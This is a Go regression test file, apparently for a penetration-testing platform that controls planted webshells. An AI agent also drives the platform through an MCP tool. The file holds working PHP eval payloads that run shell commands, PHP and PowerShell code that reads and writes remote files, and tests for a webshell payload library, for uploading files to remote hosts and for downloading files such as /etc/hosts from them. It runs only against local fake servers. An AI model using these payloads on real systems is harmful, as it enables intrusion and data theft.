package server

// webshell_test.go —— 与 MCP（/opt/artex/bin/webshell_mcp.py）的协议一致性回归。
//
// 下面的黄金向量是直接用 python3 调用 webshell_mcp.py 里的同名函数打出来的，
// 一字不改地抄进来的。任何一侧改了载荷模板/转义规则，这里就会红，从而避免
// 「页面能跑、agent 跑不了」这种两套协议漂移。

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"golang.org/x/text/encoding/simplifiedchinese"
)

// ---- 载荷构造：与 Python 侧输出逐字对比 ----

func TestWebshellPayloadGoldenVectors(t *testing.T) {
	cases := []struct {
		name string
		got  string
		want string
	}{
		{
			name: "php eval (cmd=id)",
			got:  webshellPHPCommandPayload("id"),
			want: `$__artex_c=base64_decode('aWQ=');ob_start();@system($__artex_c);$__artex_o=ob_get_clean();echo '<<ARTEXMKB>>'.base64_encode($__artex_o).'<<ARTEXMKE>>';`,
		},
		{
			name: "php_raw (echo 1 → 补分号)",
			got:  webshellPHPCodePayload("echo 1"),
			want: `ob_start();echo 1;$__artex_o=ob_get_clean();echo '<<ARTEXMKB>>'.base64_encode($__artex_o).'<<ARTEXMKE>>';`,
		},
		{
			name: "php_raw (以 } 结尾不补分号)",
			got:  webshellPHPCodePayload("if(1){echo 2;}"),
			want: `ob_start();if(1){echo 2;}$__artex_o=ob_get_clean();echo '<<ARTEXMKB>>'.base64_encode($__artex_o).'<<ARTEXMKE>>';`,
		},
		{
			name: "php write chunk (/tmp/x, abc, 覆盖)",
			got:  webshellPHPWriteCode("/tmp/x", []byte("abc"), false),
			want: `$__artex_p=base64_decode('L3RtcC94');$__artex_d=base64_decode('YWJj');$__artex_n=@file_put_contents($__artex_p,$__artex_d,0);echo ($__artex_n===false)?('ERR'):('OK:'.$__artex_n);`,
		},
		{
			name: "php write chunk (追加)",
			got:  webshellPHPWriteCode("/tmp/x", []byte("abc"), true),
			want: `$__artex_p=base64_decode('L3RtcC94');$__artex_d=base64_decode('YWJj');$__artex_n=@file_put_contents($__artex_p,$__artex_d,FILE_APPEND);echo ($__artex_n===false)?('ERR'):('OK:'.$__artex_n);`,
		},
		{
			name: "php read (/tmp/x, 1000)",
			got:  webshellPHPReadCode("/tmp/x", 1000),
			want: `$__artex_p=base64_decode('L3RtcC94');$__artex_s=@filesize($__artex_p);$__artex_r=@file_get_contents($__artex_p,false,null,0,1000);echo ($__artex_r===false)?('ERR'):('OK|'.$__artex_s.'|'.base64_encode($__artex_r));`,
		},
		{
			name: "aspx write (C:\\a.txt, 覆盖)",
			got:  webshellPowerShellWriteCmd(`C:\a.txt`, "YWJj", false),
			want: `powershell -NoProfile -NonInteractive -Command "[IO.File]::WriteAllBytes('C:\a.txt',[Convert]::FromBase64String('YWJj'))"`,
		},
		{
			name: "aspx write (追加)",
			got:  webshellPowerShellWriteCmd(`C:\a.txt`, "YWJj", true),
			want: `powershell -NoProfile -NonInteractive -Command "$o=[IO.File]::ReadAllBytes('C:\a.txt');[IO.File]::WriteAllBytes('C:\a.txt',$o+[Convert]::FromBase64String('YWJj'))"`,
		},
		{
			name: "aspx read (C:\\a.txt, 1000)",
			got:  webshellPowerShellReadCmd(`C:\a.txt`, 1000),
			want: `powershell -NoProfile -NonInteractive -Command "$b=[IO.File]::ReadAllBytes('C:\a.txt');$n=$b.Length;if($n -gt 1000){$b=$b[0..(1000-1)]};Write-Output ('OK|'+$n+'|'+[Convert]::ToBase64String($b))"`,
		},
		{
			name: "shell 单引号转义",
			got:  webshellShellQuote("a'b"),
			want: `'a'\''b'`,
		},
	}
	for _, c := range cases {
		if c.got != c.want {
			t.Errorf("%s:\n got=%q\nwant=%q", c.name, c.got, c.want)
		}
	}
}

func TestWebshellB64Lenient(t *testing.T) {
	// Python 的 b64d 容忍空白、urlsafe 变体与缺 padding
	for _, in := range []string{"YW Jj\n", "YWJj", "YWJj=="} {
		got, err := webshellB64Decode(in)
		if err != nil || string(got) != "abc" {
			t.Fatalf("webshellB64Decode(%q) = %q, %v", in, got, err)
		}
	}
	got, err := webshellB64Decode("a-b_")
	if err != nil {
		t.Fatalf("urlsafe 变体解码失败: %v", err)
	}
	if len(got) != 3 {
		t.Fatalf("urlsafe 变体解码长度 = %d", len(got))
	}
	if _, err := webshellB64Decode("@@@@"); err == nil {
		t.Fatal("非法 base64 应当报错")
	}
}

func TestWebshellExtractMarked(t *testing.T) {
	body := "prefix->|" + webshellMarkerBegin + base64.StdEncoding.EncodeToString([]byte("uid=0\n")) + webshellMarkerEnd + "|<-suffix"
	out, ok, err := webshellExtractMarked(body)
	if err != nil || !ok {
		t.Fatalf("extract: ok=%v err=%v", ok, err)
	}
	if out != "uid=0\n" {
		t.Fatalf("输出 = %q", out)
	}
	if _, ok, _ := webshellExtractMarked("no markers here"); ok {
		t.Fatal("没有标记时不应返回命中")
	}
}

func TestWebshellCleanPlain(t *testing.T) {
	// 命令型马常见的 ->| 包裹 + 尾部换行
	if got := webshellCleanPlain("->|root\n|<-", false); got != "root" {
		t.Fatalf("clean = %q", got)
	}
	// base64 回显（免杀马）应被解开
	in := base64.StdEncoding.EncodeToString([]byte("uid=0 gid=0\n"))
	if got := webshellCleanPlain(in, true); got != "uid=0 gid=0" {
		t.Fatalf("base64 回显清洗 = %q", got)
	}
	// 允不允许解由 allowB64 控制
	if got := webshellCleanPlain(in, false); got != in {
		t.Fatalf("allowB64=false 时不应解码: %q", got)
	}
}

func TestWebshellIsText(t *testing.T) {
	if !webshellIsText([]byte("hello 世界")) {
		t.Fatal("文本应判定为 text")
	}
	// GBK 编码的中文也是文本（远端常见）
	gbk, err := simplifiedchinese.GB18030.NewEncoder().Bytes([]byte("中文内容"))
	if err != nil {
		t.Fatal(err)
	}
	if !webshellIsText(gbk) {
		t.Fatal("GB18030 中文应判定为 text")
	}
	if webshellIsText([]byte{0x00, 0x01, 0x02}) {
		t.Fatal("含 NUL 应判定为二进制")
	}
	// 二进制（zip/elf 之类）绝不能被当成文本，否则页面保存时就不可逆地乱码了
	bin := []byte{0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x08, 0x08, 0xff, 0xfe, 0x81, 0x00, 0x9c}
	if webshellIsText(bin) {
		t.Fatal("二进制应判定为非文本")
	}
	if !webshellIsText(nil) {
		t.Fatal("空内容应判定为 text")
	}
}

func TestWebshellParseOKRead(t *testing.T) {
	size, data, err := webshellParseOKRead("OK|5|aGVsbG8=")
	if err != nil || size != 5 || string(data) != "hello" {
		t.Fatalf("parse: size=%d data=%q err=%v", size, data, err)
	}
	if _, _, err := webshellParseOKRead("ERR"); err == nil {
		t.Fatal("ERR 回执应当报错")
	}
}

func TestWebshellRedactURL(t *testing.T) {
	if got := webshellRedactURL("http://x/a.php"); got != "http://x/a.php" {
		t.Fatalf("无 query 不应改动: %q", got)
	}
	got := webshellRedactURL("http://x/a.php?pass=secret&id=1")
	if strings.Contains(got, "secret") {
		t.Fatalf("query 里的参数名应打码: %q", got)
	}
	if !strings.Contains(got, "id=1") {
		t.Fatalf("其它参数应保留: %q", got)
	}
}

// ---- 会话库读写 ----

func TestWebshellStoreRoundTrip(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("ARTEX_WEBSHELL_DIR", dir)
	s := &Server{}

	body := `{"name":"测试会话","url":"http://127.0.0.1:1/a.php","type":"php","password":"z0","method":"POST","header":{"X-Token":"abc"},"note":"备注"}`
	rec := httptest.NewRecorder()
	s.webshellSaveSession(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/sessions", strings.NewReader(body)))
	if rec.Code != 200 {
		t.Fatalf("保存会话失败: %d %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), `"overwritten":false`) {
		t.Fatalf("首次保存不应标记覆盖: %s", rec.Body.String())
	}

	storePath := filepath.Join(dir, webshellStoreName)
	st, err := os.Stat(storePath)
	if err != nil {
		t.Fatalf("会话库未落盘: %v", err)
	}
	// Windows 上 chmod 只影响只读位，POSIX 权限断言只在 Linux/macOS 上有意义
	// （VPS 部署后再核对 600）。
	if runtime.GOOS != "windows" {
		if perm := st.Mode().Perm(); perm != 0o600 {
			t.Fatalf("会话库权限应为 600，实际 %o", perm)
		}
	}

	// 文件结构与 MCP 一致：password 是参数名，header 是对象
	raw, err := os.ReadFile(storePath)
	if err != nil {
		t.Fatal(err)
	}
	var onDisk map[string]map[string]any
	if err := json.Unmarshal(raw, &onDisk); err != nil {
		t.Fatalf("会话库 JSON 非法: %v", err)
	}
	entry := onDisk["测试会话"]
	if entry["type"] != "php" || entry["password"] != "z0" || entry["method"] != "POST" {
		t.Fatalf("字段不符合 MCP 约定: %#v", entry)
	}
	if entry["created_at"] == "" || entry["created_at"] == nil {
		t.Fatal("created_at 必须写入")
	}

	// 列表：不能出现 password 与 header 的值
	rec = httptest.NewRecorder()
	s.webshellListSessions(rec, httptest.NewRequest(http.MethodGet, "/api/webshell/sessions", nil))
	if rec.Code != 200 {
		t.Fatalf("列表失败: %d", rec.Code)
	}
	listBody := rec.Body.String()
	for _, secret := range []string{`"z0"`, `"abc"`} {
		if strings.Contains(listBody, secret) {
			t.Fatalf("列表泄露了 password/header 值（%s）: %s", secret, listBody)
		}
	}
	if !strings.Contains(listBody, `"param_set":true`) || !strings.Contains(listBody, `"has_header":true`) {
		t.Fatalf("列表应标注自定义参数名/自定义头: %s", listBody)
	}
	if !strings.Contains(listBody, "X-Token") {
		t.Fatalf("列表应返回 header 键名: %s", listBody)
	}

	// 覆盖：created_at 保留、updated_at 出现
	body2 := `{"name":"测试会话","url":"http://127.0.0.1:1/b.php","type":"jsp","method":"GET"}`
	rec = httptest.NewRecorder()
	s.webshellSaveSession(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/sessions", strings.NewReader(body2)))
	if rec.Code != 200 || !strings.Contains(rec.Body.String(), `"overwritten":true`) {
		t.Fatalf("覆盖保存失败: %d %s", rec.Code, rec.Body.String())
	}
	store, err := webshellLoadStore(storePath)
	if err != nil {
		t.Fatal(err)
	}
	if store["测试会话"].CreatedAt != entry["created_at"] {
		t.Fatal("覆盖时 created_at 应保留")
	}
	if store["测试会话"].UpdatedAt == "" {
		t.Fatal("覆盖时应写入 updated_at")
	}

	// 删除
	req := httptest.NewRequest(http.MethodDelete, "/api/webshell/sessions/x", nil)
	req.SetPathValue("name", "测试会话")
	rec = httptest.NewRecorder()
	s.webshellDeleteSession(rec, req)
	if rec.Code != 200 {
		t.Fatalf("删除失败: %d %s", rec.Code, rec.Body.String())
	}
	rec = httptest.NewRecorder()
	s.webshellListSessions(rec, httptest.NewRequest(http.MethodGet, "/api/webshell/sessions", nil))
	if !strings.Contains(rec.Body.String(), `"sessions":[]`) {
		t.Fatalf("删除后列表应为空: %s", rec.Body.String())
	}

	// 删除不存在的会话 → 404
	req = httptest.NewRequest(http.MethodDelete, "/api/webshell/sessions/x", nil)
	req.SetPathValue("name", "没有这个")
	rec = httptest.NewRecorder()
	s.webshellDeleteSession(rec, req)
	if rec.Code != 404 {
		t.Fatalf("删不存在的会话应 404，实际 %d", rec.Code)
	}
}

func TestWebshellSaveSessionValidation(t *testing.T) {
	t.Setenv("ARTEX_WEBSHELL_DIR", t.TempDir())
	s := &Server{}
	cases := []struct{ name, body string }{
		{"会话名含斜杠", `{"name":"a/b","url":"http://x/a.php","type":"php"}`},
		{"url 非 http", `{"name":"a","url":"ftp://x/a.php","type":"php"}`},
		{"类型非法", `{"name":"a","url":"http://x/a.php","type":"ruby"}`},
		{"参数名非法", `{"name":"a","url":"http://x/a.php","type":"php","password":"a b"}`},
		{"method 非法", `{"name":"a","url":"http://x/a.php","type":"php","method":"PUT"}`},
		{"header 覆盖 Host", `{"name":"a","url":"http://x/a.php","type":"php","header":{"Host":"evil"}}`},
		{"header 不是对象", `{"name":"a","url":"http://x/a.php","type":"php","header":"不是json"}`},
	}
	for _, c := range cases {
		rec := httptest.NewRecorder()
		s.webshellSaveSession(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/sessions", strings.NewReader(c.body)))
		if rec.Code != 400 {
			t.Errorf("%s: 期望 400，实际 %d（%s）", c.name, rec.Code, rec.Body.String())
		}
	}

	// 空 header（页面表单默认发空串）应视为「没有自定义 header」，不算错误
	rec := httptest.NewRecorder()
	s.webshellSaveSession(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/sessions",
		strings.NewReader(`{"name":"empty-hdr","url":"http://x/a.php","type":"php","header":""}`)))
	if rec.Code != 200 {
		t.Fatalf("空 header 应被接受: %d %s", rec.Code, rec.Body.String())
	}

	// header 允许被转义的 JSON 字符串（表单手填的常见形态）
	rec = httptest.NewRecorder()
	body := `{"name":"a","url":"http://x/a.php","type":"php","header":"{\"X-Token\":\"abc\"}"}`
	s.webshellSaveSession(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/sessions", strings.NewReader(body)))
	if rec.Code != 200 {
		t.Fatalf("字符串形态 header 应被接受: %d %s", rec.Code, rec.Body.String())
	}
	store, err := webshellLoadStore(filepath.Join(os.Getenv("ARTEX_WEBSHELL_DIR"), webshellStoreName))
	if err != nil {
		t.Fatal(err)
	}
	if store["a"].Header["X-Token"] != "abc" {
		t.Fatalf("header 未正确解析: %#v", store["a"].Header)
	}
}

// ---- 执行：对着假 webshell 跑通 eval / 回退 / 命令型三种路径 ----

// fakeEvalShell 模拟 PHP eval 型马：把 base64_decode('…') 里的命令解出来执行，
// 用标记 + base64 回显（与真马行为一致）。
func fakeEvalShell(t *testing.T, run func(cmd string) string) *httptest.Server {
	t.Helper()
	return fakeEvalShellCode(t, run, nil)
}

// fakeEvalShellCode 在上面基础上再支持「直接跑 PHP 代码」的会话（上传/下载用）。
// runCode 为 nil 时，PHP 代码载荷一律回不带标记的垃圾。
func fakeEvalShellCode(t *testing.T, runCmd, runCode func(string) string) *httptest.Server {
	t.Helper()
	wrap := func(out string) string {
		return "->|" + webshellMarkerBegin + base64.StdEncoding.EncodeToString([]byte(out)) + webshellMarkerEnd + "|<-"
	}
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		payload := r.FormValue("pass")
		const cmdStart = "$__artex_c=base64_decode('"
		const codeStart = "ob_start();"
		switch {
		case strings.HasPrefix(payload, cmdStart):
			rest := payload[len(cmdStart):]
			b64 := rest[:strings.Index(rest, "'")]
			cmd, err := base64.StdEncoding.DecodeString(b64)
			if err != nil {
				t.Errorf("载荷里的命令不是 base64: %q", b64)
				return
			}
			_, _ = w.Write([]byte(wrap(runCmd(string(cmd)))))
		case strings.HasPrefix(payload, codeStart) && runCode != nil:
			_, _ = w.Write([]byte(wrap(runCode(payload))))
		default:
			// 非 eval 形态：回个不带标记的垃圾，逼客户端走回退分支
			_, _ = w.Write([]byte("plain-no-marker"))
		}
	}))
}

func TestWebshellExecPHP(t *testing.T) {
	ts := fakeEvalShell(t, func(cmd string) string {
		if cmd != "id" {
			t.Errorf("远端收到的命令 = %q", cmd)
		}
		return "uid=0(root) gid=0(root)\n"
	})
	defer ts.Close()

	webshellDropMode("eval-test")
	sess := webshellSession{URL: ts.URL, Type: "php", Password: "pass", Method: "POST", Header: map[string]string{"X-Token": "abc"}}
	out, mode, err := webshellExecCmd(t.Context(), "eval-test", sess, "id", 5*time.Second)
	if err != nil {
		t.Fatalf("执行失败: %v", err)
	}
	if mode != "eval" {
		t.Fatalf("模式 = %q，期望 eval", mode)
	}
	if !strings.Contains(out, "uid=0(root)") {
		t.Fatalf("输出 = %q", out)
	}
	if webshellModeOf("eval-test") != "eval" {
		t.Fatal("模式应被缓存")
	}
}

func TestWebshellExecPHPFallsBackToRaw(t *testing.T) {
	// 远端不是 eval 型：第一发（eval 探测）回垃圾，第二发（裸 base64）回 base64 输出
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		payload := r.FormValue("pass")
		if strings.HasPrefix(payload, "$__artex_c=") {
			_, _ = w.Write([]byte("<-no marker->"))
			return
		}
		cmd, err := base64.StdEncoding.DecodeString(payload)
		if err != nil {
			t.Errorf("回退载荷不是 base64: %q", payload)
			return
		}
		_, _ = w.Write([]byte(base64.StdEncoding.EncodeToString([]byte("out-of-" + string(cmd)))))
	}))
	defer ts.Close()

	webshellDropMode("raw-test")
	sess := webshellSession{URL: ts.URL, Type: "php", Password: "pass", Method: "POST"}
	out, mode, err := webshellExecCmd(t.Context(), "raw-test", sess, "whoami", 5*time.Second)
	if err != nil {
		t.Fatalf("回退执行失败: %v", err)
	}
	if mode != "raw" {
		t.Fatalf("模式 = %q，期望 raw", mode)
	}
	if out != "out-of-whoami" {
		t.Fatalf("输出 = %q", out)
	}
}

func TestWebshellExecCommandShell(t *testing.T) {
	// jsp/aspx：命令原样交给远端，回显带一句话马自带的标记
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		cmd := r.FormValue("pass")
		_, _ = w.Write([]byte("->|" + cmd + "-ok\n|<-"))
	}))
	defer ts.Close()

	sess := webshellSession{URL: ts.URL, Type: "jsp", Password: "pass", Method: "POST"}
	out, mode, err := webshellExecCmd(t.Context(), "jsp-test", sess, "whoami", 5*time.Second)
	if err != nil {
		t.Fatalf("执行失败: %v", err)
	}
	if mode != "cmd" || out != "whoami-ok" {
		t.Fatalf("mode=%q out=%q", mode, out)
	}
}

// ---- payload 库 ----

func writeFakePayloadLibrary(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	php := filepath.Join(root, "php")
	jsp := filepath.Join(root, "jsp")
	if err := os.MkdirAll(php, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(jsp, 0o755); err != nil {
		t.Fatal(err)
	}
	eval := "<?php\n// @summary 经典 eval 一句话\n// @scene 常规 PHP 站点落地\n// @perm 无限制\n// @param pass 改参数名\n"
	if err := os.WriteFile(filepath.Join(php, "eval.php"), []byte(eval), 0o644); err != nil {
		t.Fatal(err)
	}
	cmd := "<%@ page import=\"java.lang.Runtime\" %>\n// @summary 命令型 jsp 马\n"
	if err := os.WriteFile(filepath.Join(jsp, "cmd.jsp"), []byte(cmd), 0o644); err != nil {
		t.Fatal(err)
	}
	// 非本类型的文件应被忽略
	if err := os.WriteFile(filepath.Join(php, "notes.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	return root
}

func TestWebshellPayloadListAndGet(t *testing.T) {
	root := writeFakePayloadLibrary(t)
	t.Setenv("ARTEX_WEBSHELL_PAYLOAD_DIR", root)
	s := &Server{}

	rec := httptest.NewRecorder()
	s.webshellListPayloads(rec, httptest.NewRequest(http.MethodGet, "/api/webshell/payloads", nil))
	if rec.Code != 200 {
		t.Fatalf("payload 列表失败: %d %s", rec.Code, rec.Body.String())
	}
	var list struct {
		Total   int                    `json:"total"`
		Entries []webshellPayloadEntry `json:"entries"`
		Dir     string                 `json:"dir"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &list); err != nil {
		t.Fatalf("列表响应不是合法 JSON: %v", err)
	}
	if list.Total != 2 {
		t.Fatalf("应解析出 2 个 payload，实际 %d（%s）", list.Total, rec.Body.String())
	}
	if list.Dir != root {
		t.Fatalf("dir = %q", list.Dir)
	}
	var found bool
	for _, e := range list.Entries {
		if e.Name == "php/eval.php" {
			found = true
			if e.Type != "php" || e.File != "eval.php" {
				t.Fatalf("条目字段不对: %#v", e)
			}
			if e.Meta.Summary != "经典 eval 一句话" {
				t.Fatalf("@summary 解析失败: %#v", e.Meta)
			}
			if e.Meta.Scene != "常规 PHP 站点落地" {
				t.Fatalf("@scene 解析失败: %#v", e.Meta)
			}
			if e.Size <= 0 {
				t.Fatalf("size 应为正数: %d", e.Size)
			}
		}
	}
	if !found {
		t.Fatalf("未列出 php/eval.php: %s", rec.Body.String())
	}

	// 取全文
	req := httptest.NewRequest(http.MethodGet, "/api/webshell/payloads/php/eval.php", nil)
	req.SetPathValue("type", "php")
	req.SetPathValue("file", "eval.php")
	rec = httptest.NewRecorder()
	s.webshellGetPayload(rec, req)
	if rec.Code != 200 {
		t.Fatalf("payload 取全文失败: %d %s", rec.Code, rec.Body.String())
	}
	var detail struct {
		Content string `json:"content"`
		Name    string `json:"name"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &detail); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(detail.Content, "@summary") || detail.Name != "php/eval.php" {
		t.Fatalf("全文内容不对: %#v", detail)
	}

	// 越界 / 类型不匹配一律拒绝（入参错误映射 400，不存在映射 404，都不是 500）
	for _, c := range []struct {
		typ, file string
		want      int
	}{
		{"php", "../php/eval.php", 400},
		{"php", "eval.jsp", 400},
		{"php", "../../etc/passwd", 400},
		{"jsp", "eval.php", 400},
		{"ruby", "eval.rb", 400},
		{"php", "", 400},
		{"php", "missing.php", 404},
	} {
		_, _, err := webshellReadPayload(c.typ, c.file)
		if err == nil {
			t.Errorf("%s/%s 应被拒绝", c.typ, c.file)
			continue
		}
		if got := webshellErrCode(err); got != c.want {
			t.Errorf("%s/%s 状态码 = %d，期望 %d（%v）", c.typ, c.file, got, c.want, err)
		}
	}
}

// ---- 下载：远端 OK|size|b64 回执解析 + handler ----

func TestWebshellDownloadHandler(t *testing.T) {
	ts := fakeEvalShellCode(t,
		func(cmd string) string { return "" },
		func(code string) string {
			// 只有读取代码会带上 OK|size|base64 回执
			if !strings.Contains(code, "file_get_contents") {
				return ""
			}
			if !strings.Contains(code, "L2V0Yy9ob3N0cw==") { // /etc/hosts
				t.Errorf("读取代码里的路径不对: %s", code)
			}
			return "OK|7|aGVsbG8KIQ==" // hello\n!
		})
	defer ts.Close()

	t.Setenv("ARTEX_WEBSHELL_DIR", t.TempDir())
	s := &Server{}
	body := `{"name":"dl","url":"` + ts.URL + `","type":"php","password":"pass","method":"POST"}`
	rec := httptest.NewRecorder()
	s.webshellSaveSession(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/sessions", strings.NewReader(body)))
	if rec.Code != 200 {
		t.Fatalf("保存会话失败: %d %s", rec.Code, rec.Body.String())
	}
	webshellDropMode("dl")

	rec = httptest.NewRecorder()
	s.webshellDownload(rec, httptest.NewRequest(http.MethodGet, "/api/webshell/download?name=dl&remote_path=/etc/hosts", nil))
	if rec.Code != 200 {
		t.Fatalf("下载失败: %d %s", rec.Code, rec.Body.String())
	}
	var res struct {
		Mode      string `json:"mode"`
		Body      string `json:"body"`
		Size      int64  `json:"size"`
		Returned  int64  `json:"returned"`
		Truncated bool   `json:"truncated"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &res); err != nil {
		t.Fatal(err)
	}
	if res.Mode != "text" || res.Body != "hello\n!" || res.Size != 7 || res.Returned != 7 || res.Truncated {
		t.Fatalf("下载结果不对: %#v", res)
	}

	// 缺参数 → 400
	rec = httptest.NewRecorder()
	s.webshellDownload(rec, httptest.NewRequest(http.MethodGet, "/api/webshell/download?name=dl", nil))
	if rec.Code != 400 {
		t.Fatalf("缺 remote_path 应 400，实际 %d", rec.Code)
	}
}

// ---- 上传：分块写入 + 长度校验 ----

func TestWebshellUploadChunked(t *testing.T) {
	var writes []string
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		payload := r.FormValue("pass")
		start := "ob_start();"
		if !strings.HasPrefix(payload, start) {
			http.Error(w, "bad", http.StatusBadRequest)
			return
		}
		// 从 PHP 代码里还原被写入的数据长度：base64_decode('…') 的第二处
		parts := strings.Split(payload, "base64_decode('")
		if len(parts) < 3 {
			http.Error(w, "bad payload", http.StatusBadRequest)
			return
		}
		dataB64 := parts[2][:strings.Index(parts[2], "'")]
		dec, err := base64.StdEncoding.DecodeString(dataB64)
		if err != nil {
			http.Error(w, "bad b64", http.StatusBadRequest)
			return
		}
		writes = append(writes, string(dec))
		_, _ = w.Write([]byte(webshellMarkerBegin +
			base64.StdEncoding.EncodeToString([]byte("OK:"+strconv.Itoa(len(dec)))) +
			webshellMarkerEnd))
	}))
	defer ts.Close()

	t.Setenv("ARTEX_WEBSHELL_DIR", t.TempDir())
	s := &Server{}
	body := `{"name":"up","url":"` + ts.URL + `","type":"php","password":"pass","method":"POST"}`
	rec := httptest.NewRecorder()
	s.webshellSaveSession(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/sessions", strings.NewReader(body)))
	if rec.Code != 200 {
		t.Fatalf("保存会话失败: %d", rec.Code)
	}
	webshellDropMode("up")

	content := strings.Repeat("A", 5000)
	upBody, _ := json.Marshal(map[string]any{
		"name":        "up",
		"remote_path": "/tmp/upload.bin",
		"content":     content,
		"chunk_size":  4096,
	})
	rec = httptest.NewRecorder()
	s.webshellUpload(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/upload", strings.NewReader(string(upBody))))
	if rec.Code != 200 {
		t.Fatalf("上传失败: %d %s", rec.Code, rec.Body.String())
	}
	var res struct {
		Bytes int `json:"bytes"`
		Parts int `json:"parts"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &res); err != nil {
		t.Fatal(err)
	}
	if res.Bytes != 5000 || res.Parts != 2 {
		t.Fatalf("上传结果不对: %#v", res)
	}
	if len(writes) != 2 || strings.Join(writes, "") != content {
		t.Fatalf("分块内容不对: 块数=%d 总长=%d", len(writes), len(strings.Join(writes, "")))
	}

	// content 与 b64 同时给 → 400
	both, _ := json.Marshal(map[string]any{"name": "up", "remote_path": "/tmp/x", "content": "a", "b64": "YQ=="})
	rec = httptest.NewRecorder()
	s.webshellUpload(rec, httptest.NewRequest(http.MethodPost, "/api/webshell/upload", strings.NewReader(string(both))))
	if rec.Code != 400 {
		t.Fatalf("content+b64 应 400，实际 %d", rec.Code)
	}
}
